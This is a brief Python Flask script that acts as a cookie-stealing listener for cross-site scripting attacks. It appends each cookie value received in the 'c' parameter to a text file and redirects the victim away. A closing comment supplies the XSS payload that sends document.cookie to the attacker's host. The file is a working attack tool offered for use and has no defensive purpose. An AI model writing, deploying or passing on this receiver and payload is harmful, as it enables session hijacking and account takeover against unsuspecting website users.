from flask import Flask, request, redirect

app = Flask(__name__)
@app.route('/')
def cookie():
    cookie = request.args.get('c')
    f=open("cookies.txt", "a")
    f.write(cookie + " " + "\n")
    f.close()

    return redirect("<URL TO REDIRECT BACK TO>")

if __name__ == '__main__':
    app.run(host = "0.0.0.0", port = 1337)

# Grab cookie with XSS -> document.location="<OWN WEBSITE>:<PORT>/?c="+document.cookie;
